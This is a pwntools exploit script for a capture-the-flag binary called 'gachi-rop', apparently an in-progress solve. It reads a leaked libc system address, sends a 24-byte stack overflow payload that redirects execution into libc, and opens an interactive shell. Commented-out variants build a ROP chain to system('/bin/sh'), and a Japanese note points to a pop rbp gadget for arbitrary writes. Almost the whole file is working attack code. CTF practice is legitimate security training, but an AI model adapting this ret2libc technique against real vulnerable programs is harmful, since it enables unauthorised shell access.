from pwn import *

exe = ELF('./gachi-rop_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+134
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

rop = ROP(exe)
offset = 24


io.recvuntil(b'system@')
system = int(io.recvline(), 16)
libc.address = system - libc.sym.system
print(f'{hex(libc.sym.system)=}')

# rop = ROP(exe)
# system = libc.symbols["system"]
# bin_sh = next(libc.search(b"/bin/sh"))
# rop.raw(b'a' * offset)
# rop.raw(rop.ret)
# rop.call(system, [bin_sh])

# io.sendlineafter(b': ', rop.chain())
# io.interactive()

# io.sendlineafter(b'Name:', b'A' * offset + pack(libc.sym.gets) + pack(exe.sym.main + 18))
io.sendlineafter(b'Name:', b'A' * offset + pack(libc.sym.system) + pack(exe.sym.main + 18))
# io.sendlineafter(b'Name:', b'A' * offset + pack(libc.sym.puts))
io.interactive()

# pop rbp; ret で任意位置に書き込めそう

